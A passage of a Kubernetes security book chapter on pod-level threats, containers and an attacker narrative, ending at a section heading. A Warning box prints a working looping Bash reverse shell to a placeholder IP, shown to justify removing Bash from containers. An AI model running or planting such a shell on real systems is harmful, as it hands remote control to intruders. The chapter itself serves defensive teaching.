<html><head></head><body><div id="sbo-rt-content"><section data-type="chapter" epub:type="chapter" data-pdf-bookmark="Chapter 2. Pod-Level Resources"><div class="chapter" id="ch-pod-level-resources">
<h1><span class="label">Chapter 2. </span>Pod-Level Resources</h1>


<p>This chapter concerns the <a data-type="indexterm" data-primary="pods" id="idm45302824859104"/>atomic unit of Kubernetes deployment: a pod.
Pods run apps, and an app may be one or more containers working together in one
or more pods.</p>

<p>We’ll consider what bad things can happen in and around a pod, and look at how you
can mitigate the risk of getting attacked.</p>

<p>As with any sensible security effort, we’ll begin by defining a lightweight
threat model for your system, identifying the threat actors it defends against,
and highlighting the most dangerous threats. This gives you a solid basis to
devise countermeasures and controls, and take defensive steps to protect your customer’s valuable data.</p>

<p>We’ll go deep into the security model of a pod and look at what is trusted by default,
where we can tighten security with configuration, and what an attacker’s journey looks like.</p>






<section data-type="sect1" data-pdf-bookmark="Defaults"><div class="sect1" id="idm45302824856080">
<h1>Defaults</h1>

<p>Kubernetes has historically not been security hardened out of the box, and sometimes this may lead to <a data-type="indexterm" data-primary="privilege escalation" id="idm45302824854400"/><a data-type="indexterm" data-primary="container breakouts" id="idm45302824853696"/>privilege
escalation or container breakout.</p>

<p>If we zoom in on the relationship<a data-type="indexterm" data-primary="default configuration, pods" id="idm45302824852512"/><a data-type="indexterm" data-primary="pods" data-secondary="default configuration" id="idm45302824851744"/> between a single pod and the host in <a data-type="xref" href="#pod-diagram-temp">Figure 2-1</a>, we can see the services offered to the container by the <code>kubelet</code> and potential security boundaries that may keep an adversary at bay.</p>

<p>By default<a data-type="indexterm" data-primary="pod architecture" id="idm45302824849072"/> much of this is sensibly configured with least privilege, but where user-supplied configuration is more
common (pod YAML, cluster policy, container images) there are more opportunities for accidental or malicious
misconfiguration. Most defaults are sane—in this chapter we will show you where they are not, and demonstrate how to
test that your clusters and workloads are configured securely.</p>

<figure><div id="pod-diagram-temp" class="figure">
<img src="Images/haku_0201.png" alt="Pod Architecture" width="1436" height="1841"/>
<h6><span class="label">Figure 2-1. </span>Pod architecture</h6>
</div></figure>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Threat Model"><div class="sect1" id="idm45302824845728">
<h1>Threat Model</h1>

<p>We define a scope <a data-type="indexterm" data-primary="pods" data-secondary="threat models" id="pods_thrtmod"/><a data-type="indexterm" data-primary="threat models" data-secondary="pods" id="thrtmod_pods"/>for each threat model. Here, you are threat modeling a pod. Let’s consider a simple group of Kubernetes threats <a data-type="indexterm" data-primary="threats" data-secondary="types" id="idm45302824841728"/>to begin with:</p>
<dl>
<dt><a href="https://oreil.ly/PoRXb">Attacker on the network</a></dt>
<dd>
<p>Sensitive endpoints (such as the API server) can be attacked easily if public.</p>
</dd>
<dt><a href="https://oreil.ly/CYG04">Compromised application leads to foothold in container</a></dt>
<dd>
<p>A compromised application (remote code execution, supply chain compromise) is the start of an attack.</p>
</dd>
<dt><a href="https://oreil.ly/zJGhK">Establish persistence</a></dt>
<dd>
<p>Stealing credentials or gaining persistence resilient to pod, node, and/or container restarts.</p>
</dd>
<dt><a href="https://oreil.ly/POnQ9">Malicious code execution</a></dt>
<dd>
<p>Running exploits to <a data-type="indexterm" data-primary="exploits" data-secondary="malicious code execution" id="idm45302824833008"/>pivot or escalate and enumerating endpoints.</p>
</dd>
<dt><a href="https://oreil.ly/agQ7E">Access sensitive data</a></dt>
<dd>
<p>Reading Secret data from the API server, attached storage, and network-accessible datastores.</p>
</dd>
<dt><a href="https://oreil.ly/nr7Cb">Denial of service</a></dt>
<dd>
<p>Rarely a good use of an attacker’s time. Denial of Wallet and cryptolocking are common <a data-type="indexterm" data-primary="pods" data-secondary="threat models" data-startref="pods_thrtmod" id="idm45302824828128"/><a data-type="indexterm" data-primary="threat models" data-secondary="pods" data-startref="thrtmod_pods" id="idm45302824826880"/>variants.</p>
</dd>
</dl>
<div data-type="tip"><h6>Tip</h6>
<p>The threat sources in <a data-type="xref" href="ch01.xhtml#PriorArt">“Prior Art”</a> have other negative outcomes to cross-reference with this list.</p>
</div>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Anatomy of the Attack"><div class="sect1" id="idm45302824823312">
<h1>Anatomy of the Attack</h1>
<div class="clear">
<figure class="informal no-frame width-35"><div id="captain2" class="figure">
<img src="Images/haku_0000.png" alt="captain" width="1086" height="1103"/>
<h6/>
</div></figure>
<p>Captain Hashjack started their assault on your systems by enumerating BCTL’s DNS subdomains and S3 buckets. These could have offered an easy way into the organization’s systems, but there was nothing easily exploitable on this occasion.</p>

<p>Undeterred, they create an account on the public website and log in, using a web application scanner like <a href="https://www.zaproxy.org">zaproxy</a>  (OWASP Zed Attack Proxy) to pry into API calls and application code for unexpected responses. They’re on the search for leaking web-server banner and version information (to learn which exploits might succeed) and are generally injecting and fuzzing APIs for poorly handled user input.</p>
</div>

<p>This<a data-type="indexterm" data-primary="attacks" data-secondary="methodologies" id="idm45302824816768"/> is not a level of scrutiny that your poorly maintained codebase and systems are likely to withstand for long. Attackers may be searching for a needle in a haystack, but only the safest haystack has no needles at all.</p>
<div data-type="caution"><h6>Caution</h6>
<p>Any computer should be resistant to this type of indiscriminate attack: a Kubernetes system should achieve “minimum viable security” through <a data-type="indexterm" data-primary="minimum viable security" id="idm45302824814256"/>the capability to protect itself from casual attack with up-to-date software and hardened configuration. Kubernetes encourages regular updates<a data-type="indexterm" data-primary="updating Kubernetes, version support" id="idm45302824813264"/><a data-type="indexterm" data-primary="version support" id="idm45302824812576"/><a data-type="indexterm" data-primary="support, updating Kubernetes" id="idm45302824811904"/> by supporting the last three minor releases (e.g., 1.24, 1.23, and 1.22), which are released every 4 months and ensure a year of patch support. Older versions are unsupported and likely
to be vulnerable.</p>
</div>

<p>Although many parts of an attack can be automated, this is an involved process. A casual attacker is more likely to scan widely for software paths that trigger published CVEs and run automated tools and scripts against large ranges of IPs (such as the ranges advertised by public cloud providers). These are noisy approaches.</p>








<section data-type="sect2" data-pdf-bookmark="Remote Code Execution"><div class="sect2" id="idm45302824809888">
<h2>Remote Code Execution</h2>

<p>If a vulnerability in your<a data-type="indexterm" data-primary="remote code execution (RCE)" data-see="RCE (remote code execution)" id="idm45302824808096"/><a data-type="indexterm" data-primary="RCE (remote code execution)" id="RCE"/><a data-type="indexterm" data-primary="attacks" data-seealso="vulnerabilities" id="idm45302824806128"/><a data-type="indexterm" data-primary="vulnerabilities" data-seealso="attacks" id="idm45302824805184"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="RCE" id="vuln_RCE"/> application can be used to run untrusted (and in this case, external) code, it is called
a remote code execution (RCE). An adversary can use an RCE to spawn a<a data-type="indexterm" data-primary="remote control sessions" id="idm45302824802720"/> remote control session into the application’s
environment: here it is the container handling the network request, but if the RCE manages to pass untrusted
input deeper into the system, it may <a data-type="indexterm" data-primary="exploits" data-secondary="RCE and" id="idm45302824801712"/>exploit a different process, pod, or cluster.</p>

<p>Your first goal of Kubernetes and pod security should be to prevent RCE, which could be as
simple as a <code>kubectl exec</code>, or as complex as a <a data-type="indexterm" data-primary="reverse shells" id="idm45302824799856"/><a data-type="indexterm" data-primary="pods" data-secondary="reverse shells" id="idm45302824799120"/><a data-type="indexterm" data-primary="attacks" data-secondary="reverse shells" id="idm45302824798176"/>reverse shell, such as the one demonstrated in <a data-type="xref" href="#pods-reverse-shell">Figure 2-2</a>.</p>

<figure><div id="pods-reverse-shell" class="figure">
<img src="Images/haku_0202.png" alt="haku 0202" width="1447" height="641"/>
<h6><span class="label">Figure 2-2. </span>Reverse shell into a Kubernetes pod</h6>
</div></figure>

<p>Application code changes frequently and may hide undiscovered bugs, so robust application security (AppSec) practices (including IDE and CI/CD
integration of tooling and dedicated security requirements as task acceptance criteria) are essential to keep an
attacker from compromising the processes running in a pod.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>The Java framework Struts <a data-type="indexterm" data-primary="Struts, attacks on" id="idm45302824792576"/><a data-type="indexterm" data-primary="Equifax, attack on" id="idm45302824791872"/>was one of the most widely deployed libraries to have suffered a remotely exploitable vulnerability (CVE-2017-5638), which contributed to the breach of Equifax customer data. To fix a supply chain vulnerability like this in a container, it is quickly rebuilt in CI with a patched library and redeployed, reducing the risk window of vulnerable libraries being exposed to the internet. We examine other ways to get remote code execution throughout the book.</p>
</div>

<p>With that, let’s move on to the network <a data-type="indexterm" data-primary="RCE (remote code execution)" data-startref="RCE" id="idm45302824790032"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="RCE" data-startref="vuln_RCE" id="idm45302824788992"/>aspects.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Network Attack Surface"><div class="sect2" id="idm45302824787520">
<h2>Network Attack Surface</h2>

<p>The greatest<a data-type="indexterm" data-primary="network attack surface" id="netattacksurf"/><a data-type="indexterm" data-primary="attack surface" data-secondary="network interfaces" id="attacksurf_netinterfaces"/><a data-type="indexterm" data-primary="pods" data-secondary="attack surface" id="pods_attacksurf"/> attack surface of a Kubernetes cluster is its network interfaces
and public-facing pods. Network-facing services such as web servers
are the first line of defense in keeping your clusters secure, a topic we will
dive into in <a data-type="xref" href="ch05.xhtml#ch-networking">Chapter 5</a>.</p>

<p>This is because unknown users coming in from across the network can scan network-facing
applications for the exploitable signs of RCE. They can use <a data-type="indexterm" data-primary="automated network scanners" id="idm45302824780640"/>automated network scanners
to attempt to exploit known vulnerabilities and input-handling errors in
network-facing code. If a process or system can be forced to run in an unexpected way,
there is the possibility that it can be compromised through these untested logic paths.</p>

<p>To investigate how an attacker may establish a foothold in a remote system using only the humble, all-powerful <a data-type="indexterm" data-primary="Bash shell" id="idm45302824778992"/>Bash shell, see, for example, Chapter 16 of
<a href="https://oreil.ly/ZmILo"><em>Cybersecurity Ops with bash</em></a> by Paul Troncone and Carl Albing (O’Reilly).</p>

<p>To defend against this, we must scan containers for operating system and application<a data-type="indexterm" data-primary="security" data-secondary="CVEs" id="idm45302824776896"/><a data-type="indexterm" data-primary="Common Vulnerabilities and Exposures (CVEs)" data-see="CVEs (Common Vulnerabilities and Exposures)" id="idm45302824775952"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" id="idm45302824774880"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="CVEs" id="idm45302824774176"/>
CVEs in the hope of updating them before they are exploited.</p>

<p>If Captain Hashjack has an RCE into a pod, it’s a foothold to attack your system more deeply from the pod’s network
position and permissions set. You should strive to limit what an attacker can do from this position, and customize your security
configuration to a workload’s sensitivity. If your controls are too loose, this may be the beginning of an
organization-wide breach for your employer, BCTL.</p>
<div data-type="tip"><h6>Tip</h6>
<p>For an example of spawning a shell via Struts with Metasploit,
see <a href="https://oreil.ly/nzsxP">Sam Bowne’s guide</a>.</p>
</div>

<p>As Dread Pirate Hashjack has just discovered, we have also been running a vulnerable version of the Struts library. This
offers an opportunity to start attacking the<a data-type="indexterm" data-primary="clusters" data-seealso="containers; pods; workloads" id="idm45302824769760"/> cluster from within.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>A simple Bash reverse shell <a data-type="indexterm" data-primary="Bash shell" data-secondary="reverse shell attack" id="idm45302824767584"/>like this one is a good reason to remove Bash from your containers. It uses Bash’s
virtual <em>/dev/tcp/</em> filesystem, and is not exploitable in <code>sh</code>, which doesn’t include this oft-abused feature:</p>

<pre data-type="programlisting" data-code-language="bash">revshell<code class="o">()</code> <code class="o">{</code>
    <code class="nb">local </code><code class="nv">TARGET_IP</code><code class="o">=</code><code class="s2">"</code><code class="si">${</code><code class="nv">1</code><code class="k">:-</code><code class="nv">123</code><code class="p">.123.123.123</code><code class="si">}</code><code class="s2">"</code><code class="p">;</code>
    <code class="nb">local </code><code class="nv">TARGET_PORT</code><code class="o">=</code><code class="s2">"</code><code class="si">${</code><code class="nv">2</code><code class="k">:-</code><code class="nv">1234</code><code class="si">}</code><code class="s2">"</code><code class="p">;</code>
    <code class="k">while</code> :<code class="p">;</code> <code class="k">do</code>
        nohup bash -i <code class="p">&amp;</code>&gt; <code class="se">\</code>
          /dev/tcp/<code class="si">${</code><code class="nv">TARGET_IP</code><code class="si">}</code>/<code class="si">${</code><code class="nv">TARGET_PORT</code><code class="si">}</code> 0&gt;<code class="p">&amp;</code>1<code class="p">;</code>
        sleep 1<code class="p">;</code>
    <code class="k">done</code>
<code class="o">}</code></pre>
</div>

<p>As the attack begins, let’s take a look at where the pirates have landed: inside a Kubernetes<a data-type="indexterm" data-primary="network attack surface" data-startref="netattacksurf" id="idm45302828898400"/><a data-type="indexterm" data-primary="attack surface" data-secondary="network interfaces" data-startref="attacksurf_netinterfaces" id="idm45302827850160"/><a data-type="indexterm" data-primary="pods" data-secondary="attack surface" data-startref="pods_attacksurf" id="idm45302830546160"/> pod.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Kubernetes Workloads: Apps in a Pod"><div class="sect1" id="idm45302824786896">
<h1>Kubernetes Workloads: Apps in a Pod</h1>

<p>Multiple cooperating containers<a data-type="indexterm" data-primary="containers" data-secondary="pods" id="idm45302826950096"/><a data-type="indexterm" data-primary="pods" data-secondary="containers" id="idm45302828961712"/><a data-type="indexterm" data-primary="pods" data-seealso="clusters; containers; workloads" id="idm45302826176992"/><a data-type="indexterm" data-primary="workloads" data-seealso="clusters; containers; pods" id="idm45302829072992"/> can be logically grouped into a single pod, and every container Kubernetes runs must run
inside a pod. Sometimes a pod is called a “workload,” which is one of many copies of the same<a data-type="indexterm" data-primary="execution environment" id="idm45302827890192"/><a data-type="indexterm" data-primary="nodes" id="idm45302826000000"/> execution
environment. Each pod must run on a Node in your Kubernetes cluster as shown in <a data-type="xref" href="#pod-cluster-example">Figure 2-3</a>.</p>

<p>A pod is a <a data-type="indexterm" data-primary="clusters" data-secondary="deployment diagram" id="idm45302826316512"/>single instance of your application, and to scale<a data-type="indexterm" data-primary="pods" data-secondary="scaling" id="idm45302827753488"/> to demand, many identical pods are used to replicate the
application by a workload resource (such as a Deployment, DaemonSet, or StatefulSet).</p>

<p>Your pods may include <a data-type="indexterm" data-primary="sidecar containers" id="idm45302830446608"/><a data-type="indexterm" data-primary="containers" data-secondary="sidecars" id="idm45302828812944"/>sidecar containers supporting monitoring, network, and security, and “init” containers for pod bootstrap, enabling you to deploy different application styles. These sidecars are likely to have elevated privileges and be of interest to an adversary.</p>

<p class="pagebreak-before">“Init” containers <a data-type="indexterm" data-primary="init containers" id="idm45302825943760"/><a data-type="indexterm" data-primary="containers" data-secondary="init" id="idm45302826367008"/><a data-type="indexterm" data-primary="namespaces" data-secondary="init containers" id="idm45302830426416"/>run in order (first to last) to set up a pod and can make security changes to the namespaces, like Istio’s init container that configures the pod’s <em>iptables</em> (in the kernel’s netfilter) so the runtime (non-init container) pods route traffic through a sidecar container. Sidecars run alongside the primary container in the pod, and all non-init containers in a pod start at the same time.</p>

<figure><div id="pod-cluster-example" class="figure">
<img src="Images/haku_0203.png" alt="Cluster deployment example" width="1401" height="1152"/>
<h6><span class="label">Figure 2-3. </span>Cluster deployment example; source: <a href="https://oreil.ly/Co9Hx">Kubernetes documentation</a></h6>
</div></figure>

<p>What’s inside a<a data-type="indexterm" data-primary="pods" data-secondary="contents" id="idm45302829833888"/> pod? Cloud native<a data-type="indexterm" data-primary="cloud" data-secondary="native applications" id="idm45302827129120"/> applications are often microservices, web servers, workers, and batch processes. Some pods run one-shot tasks (wrapped with a job, or maybe one single nonrestarting container), perhaps running multiple other pods to assist. All these pods present an opportunity to an attacker. Pods get hacked. Or, more often, a network-facing container process gets hacked.</p>

<p class="pagebreak-before">A pod is a trust<a data-type="indexterm" data-primary="trust boundaries" data-secondary="pods" id="idm45302824740240"/><a data-type="indexterm" data-primary="threat modeling" data-secondary="pods, trust boundaries" id="idm45302824739232"/> boundary encompassing all the containers inside, including their identity and access. There is still separation between pods that you can enhance with policy configuration, but you should consider the entire contents of a pod when threat modeling it.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Kubernetes is a distributed system, and ordering of actions (such as applying a multidoc YAML file) is eventually
consistent, meaning that <a data-type="indexterm" data-primary="API calls" id="idm45302819082576"/>API calls don’t always complete in the order that you expect. Ordering
depends on various factors and shouldn’t be relied upon. Tabitha Sable has a mechanically sympathetic definition of 
<span class="keep-together">Kubernetes.</span></p>
<figure class="informal width-50 no-frame"><div id="tweet-tabby" class="figure">
<img src="Images/haku_0204.png" alt="tabby sable" width="1216" height="648"/>
<h6/>
</div></figure>
</div>
</div></section>













<section data-type="sect1" data-pdf-bookmark="What’s a Pod?"><div class="sect1" id="idm45302827957008">
<h1>What’s a Pod?</h1>

<p>A pod as <a data-type="indexterm" data-primary="pods" data-secondary="overview" id="idm45302819076752"/>depicted in <a data-type="xref" href="#pod-examples">Figure 2-4</a> is a Kubernetes invention. It’s an
environment for multiple containers to run inside. The pod is the smallest deployable
unit you can ask Kubernetes to run and all containers in it will be launched on
the same node. A pod has its own IP address, can mount in storage, and its namespaces surround the
containers created by the container runtime such as <code>containerd</code> or CRI-O.</p>

<figure><div id="pod-examples" class="figure">
<img src="Images/haku_0205.png" alt="Example pods" width="1442" height="388"/>
<h6><span class="label">Figure 2-4. </span>Example pods (source: <a href="https://oreil.ly/YwBSv">Kubernetes documentation</a>)</h6>
</div></figure>

<p class="pagebreak-before">A container <a data-type="indexterm" data-primary="pods" data-secondary="containers" id="idm45302819070624"/><a data-type="indexterm" data-primary="containers" data-seealso="clusters; pods; workloads" id="idm45302819069616"/>is a mini-Linux, and its processes are containerized with control groups
(<code>cgroups</code>) to limit resource usage and namespaces to limit access. A variety of other
controls can be applied to restrict a containerized process’s behavior, as we’ll see in this chapter.</p>

<p>The lifecycle <a data-type="indexterm" data-primary="pods" data-secondary="lifecycle" id="idm45302819067360"/><a data-type="indexterm" data-primary="lifecycle, pods" id="idm45302819066352"/><a data-type="indexterm" data-primary="kubelet" id="idm45302819065680"/>of a pod is controlled by the <code>kubelet</code>, the Kubernetes API server’s deputy, deployed on each node in the
cluster to manage and run containers. If the <code>kubelet</code> loses contact with the API server, it will continue to manage its
workloads, restarting them if necessary. If the <code>kubelet</code> crashes, the container manager will also keep containers running
in case they crash. The <code>kubelet</code> and container manager oversee your workloads.</p>

<p>The <code>kubelet</code> runs pods on <a data-type="indexterm" data-primary="worker nodes" id="idm45302819061920"/>worker nodes to instruct the container runtime and configuring network and storage. Each
container in a pod is a collection of Linux <a data-type="indexterm" data-primary="containers" data-secondary="namespaces" id="idm45302819060912"/><a data-type="indexterm" data-primary="pods" data-secondary="namespaces" id="idm45302819059968"/><a data-type="indexterm" data-primary="namespaces" data-secondary="containers" id="idm45302819059024"/>namespaces, <code>cgroups</code>, <a data-type="indexterm" data-primary="cgroups" id="idm45302819057536"/><a data-type="indexterm" data-primary="capabilities" id="idm45302819056800"/><a data-type="indexterm" data-primary="Linux Security Modules (LSMs)" data-see="LSMs (Linux Security Modules)" id="idm45302819039632"/><a data-type="indexterm" data-primary="LSMs (Linux Security Modules)" id="idm45302819038896"/>capabilities, and Linux Security Modules (LSMs). As the
container runtime builds a container, each namespace is created and <a data-type="indexterm" data-primary="configuration" data-secondary="containers" id="idm45302819038016"/>configured individually before being combined into
a container.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Capabilities are individual switches for “special” root user operations such as changing any file’s permissions,
loading modules into the kernel, accessing devices in raw mode (e.g., networks and I/O), BPF and performance monitoring,
and every other operation.</p>

<p>The root user has all capabilities, and capabilities can be granted to any process or user (“ambient
capabilities”). Excess capability grants may lead to container breakout, as we see later in this 
<span class="keep-together">chapter.</span></p>
</div>

<p>In Kubernetes, a newly created container is added to the pod by the container runtime, where it shares network and
interprocess communication namespaces between pod containers.</p>

<p><a data-type="xref" href="#node-examples">Figure 2-5</a> shows a <code>kubelet</code> running four individual pods on a single node.</p>

<p>The container<a data-type="indexterm" data-primary="nodes" data-secondary="diagram of" id="idm45302819032432"/> is the first line of defense against an adversary, and container images should be scanned for <a data-type="indexterm" data-primary="containers" data-secondary="CVEs, scanning for" id="idm45302819031344"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="containers" id="idm45302819030496"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="containers" id="idm45302819029648"/>CVEs before
being run. This simple step reduces the risk of running an outdated or malicious container and informs your risk-based
deployment decisions: do you ship to production, or is there an exploitable CVE that needs patching first?</p>

<figure><div id="node-examples" class="figure">
<img src="Images/haku_0206.png" alt="Example pods on a node" width="1453" height="1057"/>
<h6><span class="label">Figure 2-5. </span>Example pods on a node (source: <a href="https://oreil.ly/ksFim">Kubernetes documentation</a>)</h6>
</div></figure>
<div data-type="tip"><h6>Tip</h6>
<p>“Official” container images in public registries have a greater likelihood of being up to date and well-patched, and
Docker Hub <a data-type="indexterm" data-primary="Docker Hub" id="idm45302819024784"/><a data-type="indexterm" data-primary="Notary" id="idm45302819024176"/><a data-type="indexterm" data-primary="containers" data-secondary="public registries" id="idm45302819023568"/><a data-type="indexterm" data-primary="public registries" data-secondary="container security" id="idm45302819022720"/>signs all official images with Notary, as we’ll see in <a data-type="xref" href="ch04.xhtml#ch-apps-supply-chain">Chapter 4</a>.</p>
</div>

<p>Public container registries often host malicious images, so detecting them before production is essential.
<a data-type="xref" href="#app-poison-container-registry">Figure 2-6</a> shows how this might happen.</p>

<p>The <code>kubelet</code> attaches pods to a <a data-type="indexterm" data-primary="Container Network Interface (CNI)" id="idm45302819018864"/><a data-type="indexterm" data-primary="CNI (Container Network Interface)" id="idm45302819018256"/><a data-type="indexterm" data-primary="pods" data-secondary="CNI" id="idm45302819017648"/>Container Network Interface (CNI). CNI network traffic is treated as layer 4 TCP/IP (although the underlying network technology used by the CNI plug-in may differ), and encryption is the job of the CNI plug-in, the application, a service mesh, or at a minimum, the underlay networking between the nodes. If traffic is
unencrypted, it may be sniffed by a compromised pod or node.</p>

<figure><div id="app-poison-container-registry" class="figure">
<img src="Images/haku_0207.png" alt="Poisoning a public container registry" width="1446" height="890"/>
<h6><span class="label">Figure 2-6. </span>Poisoning a public container registry</h6>
</div></figure>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>Although starting a malicious container under a correctly configured container runtime is usually safe, there have been
attacks against the container bootstrap phase. We examine the 
<span class="keep-together"><em>/proc/self/exe</em></span> breakout CVE-2019-5736 later in this

<span class="keep-together">chapter.</span></p>
</div>

<p>Pods can also have <a data-type="indexterm" data-primary="pods" data-secondary="storage" id="idm45302819011472"/><a data-type="indexterm" data-primary="storage" data-secondary="pods" id="idm45302819010624"/>storage attached by Kubernetes, using the (<a href="https://oreil.ly/S8v3B">Container Storage Interface (CSI)</a>), which <a data-type="indexterm" data-primary="CSI (Container Storage Interface)" id="idm45302819009024"/><a data-type="indexterm" data-primary="Container Storage Interface (CSI)" id="idm45302819008416"/>includes the PersistentVolumeClaim and StorageClass shown in  <a data-type="xref" href="#pod-cluster-example-2">Figure 2-7</a>.
In <a data-type="xref" href="ch06.xhtml#ch-storage">Chapter 6</a> we will get deeper into the storage aspects.</p>

<p>In <a data-type="xref" href="#pod-cluster-example-2">Figure 2-7</a> you can see a view of the <a data-type="indexterm" data-primary="control plane" id="idm45302819004992"/>control plane and the API server’s <a data-type="indexterm" data-primary="API server" data-secondary="importance of" id="idm45302819004256"/><a data-type="indexterm" data-primary="clusters" data-secondary="API server, importance of" id="idm45302819003408"/><a data-type="indexterm" data-primary="etcd" data-secondary="clusters, importance of" id="idm45302819002560"/>central role in the cluster. The API server is responsible for interacting with the cluster datastore (<code>etcd</code>), hosting the cluster’s extensible API surface, and managing the <code>kubelet</code>s. If the API server or <code>etcd</code> instance is compromised, the attacker has complete control
of the cluster: these are the most sensitive parts of the system.</p>

<figure><div id="pod-cluster-example-2" class="figure">
<img src="Images/haku_0208.png" alt="Cluster Example 2" width="1439" height="831"/>
<h6><span class="label">Figure 2-7. </span>Cluster example 2 (source: <a href="https://oreil.ly/szUug">Tsuyoshi Ushio</a>)</h6>
</div></figure>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>Vulnerabilities have been <a data-type="indexterm" data-primary="vulnerabilities" data-secondary="storage drivers" id="idm45302818996832"/><a data-type="indexterm" data-primary="storage" data-secondary="vulnerabilities" id="idm45302818995984"/>found in many storage drivers, including CVE-2018-11235, which exposed a <a data-type="indexterm" data-primary="Git" data-secondary="attacks on storage volumes" id="idm45302818995008"/><a data-type="indexterm" data-primary="attacks" data-secondary="Git" data-tertiary="storage volumes" id="idm45302818994160"/>Git attack on the
<code>gitrepo</code> storage volume, and CVE-2017-1002101, a subpath volume mount mishandling error. We will cover these in
<a data-type="xref" href="ch06.xhtml#ch-storage">Chapter 6</a>.</p>
</div>

<p>For performance in larger clusters, the control plane should run on
separate infrastructure to <code>etcd</code>, which requires high disk and network
I/O to support reasonable response times for its
distributed consensus algorithm, <a href="https://oreil.ly/V5lbf">Raft</a>.</p>

<p>As the API server is the <code>etcd</code> cluster’s only client, compromise of either
effectively roots the cluster: due to the asynchronous scheduling, in Kubernetes the
injection of malicious, unscheduled pods into <code>etcd</code> will trigger their scheduling
to a <code>kubelet</code>.</p>

<p>As with all fast-moving software, there have been <a data-type="indexterm" data-primary="vulnerabilities" data-secondary="mitigating" id="idm45302818987936"/>vulnerabilities in most parts of the Kubernetes stack.
The only solution to running modern software is a healthy continuous integration infrastructure
capable of promptly redeploying vulnerable clusters upon a vulnerability announcement.</p>
</div></section>













<section data-type="sect1" class="less_space pagebreak-before" data-pdf-bookmark="Understanding Containers"><div class="sect1" id="idm45302819077888">
<h1>Understanding Containers</h1>

<p>Okay, so we have a high-level <a data-type="indexterm" data-primary="containers" data-secondary="overview" id="cont_oview"/>view of a cluster. But at a low level, what is a “container”? It is a microcosm of<a data-type="indexterm" data-primary="Linux" data-secondary="relationship to containers" id="idm45302818984016"/> Linux
that gives a process the illusion of a dedicated kernel, network, and userspace. Software trickery fools the
process inside your container into believing it is the only process running on the host machine. This is useful for
isolation and migration of your existing workloads into Kubernetes.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>As <a href="https://oreil.ly/lBByx">Christian Brauner</a> and <a href="https://oreil.ly/DsmkD">Stéphane Graber</a> like
<a href="https://oreil.ly/sTkqN">to say</a> “(Linux) containers are a userspace fiction,” a collection of
configurations that present an illusion of isolation to a process inside.
Containers emerged from the primordial kernel soup, a child of evolution rather than intelligent design that has been
morphed, refined, and coerced into shape so that we now have something usable.</p>
</div>

<p>Containers don’t exist as a single API, library, or kernel feature. They are
merely the resultant bundling and isolation that’s left over once the kernel has
started a collection of namespaces, configured some <code>cgroups</code> and capabilities, added
Linux Security Modules like AppArmor and
SELinux, and started our precious little process inside.</p>

<p>A container is a process in a special environment with some combination of namespaces either enabled or shared with the
host (or other containers). The process comes from a <a data-type="indexterm" data-primary="container images" id="idm45302818977776"/>container image, a TAR file containing the container’s root
filesystem, its application(s), and any dependencies. When the image is unpacked into a directory on the host and a
special filesystem “pivot root” is created, a “container” is constructed around it, and its <code>ENTRYPOINT</code> is run from the
filesystem within the container. This is roughly how a container starts, and each container in a pod must go through
this process.</p>

<p>Container security <a data-type="indexterm" data-primary="security" data-secondary="containers, overview" id="idm45302818975824"/>has two parts: the contents of the container image, and its runtime configuration and security
context. An abstract risk rating of a container can be derived from the number of security primitives it enables and
uses safely, avoiding host namespaces, limiting resource use with <code>cgroups</code>, dropping unneeded capabilities, tightening
security module configuration for the process’s usage pattern, and minimizing process and filesystem ownership and
contents. <a href="https://kubesec.io">Kubesec.io</a> rates <a data-type="indexterm" data-primary="Kubesec.io, pod security" id="idm45302818973360"/>a pod configuration’s security on how well it enables these features at 
<span class="keep-together">runtime.</span></p>

<p class="pagebreak-before">When the kernel<a data-type="indexterm" data-primary="IP allocations, namespaces and" id="idm45302818971504"/><a data-type="indexterm" data-primary="namespaces" data-secondary="IP allocations and" id="idm45302818970896"/> detects a network namespace is empty, it will destroy the namespace, removing any IPs allocated to
network adapters in it. For a pod with only a single container to hold the network namespace’s IP allocation, a crashed
and restarting container would have a new network namespace created and so have a new IP assigned. This rapid churn of
IPs would create unnecessary noise for your operators and security monitoring.
Kubernetes uses the so-called pause container (see also <a data-type="xref" href="ch05.xhtml#workload-networking-intra-pod">“Intra-Pod Networking”</a>),
to hold the pod’s shared network namespace open in the event of a crash-looping
tenant container. From inside a worker node, the companion pause container in each
pod looks as follows:</p>

<pre data-type="programlisting" data-code-language="text">andy@k8s-node-x:~ [0]$ docker ps --format '{{.Image}} {{.Names}}' |
  grep "sublimino-"
busybox k8s_alpine_sublimino-frontend-5cc74f44b8-4z86v_default-0
k8s.gcr.io/pause:3.3 k8s_POD_sublimino-frontend-5cc74f44b8-4z86v-1
...
busybox k8s_alpine_sublimino-microservice-755d97b46b-xqrw9_default_0
k8s.gcr.io/pause:3.3 k8s_POD_sublimino-microservice-755d97b46b-xqrw9_default_1
...
busybox k8s_alpine_sublimino-frontend-5cc74f44b8-hnxz5_default_0
k8s.gcr.io/pause:3.3 k8s_POD_sublimino-frontend-5cc74f44b8-hnxz5_default_1</pre>

<p>This pause container is invisible via the Kubernetes API, but visible to the
container runtime on the worker <a data-type="indexterm" data-primary="containers" data-secondary="overview" data-startref="cont_oview" id="idm45302818963840"/>node.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>CRI-O dispenses with the pause container (unless absolutely necessary) by pinning namespaces,
as described in the KubeCon talk <a href="https://oreil.ly/EqEwr">“CRI-O:
Look Ma, No Pause”</a>.</p>
</div>








<section data-type="sect2" data-pdf-bookmark="Sharing Network and Storage"><div class="sect2" id="idm45302818966688">
<h2>Sharing Network and Storage</h2>

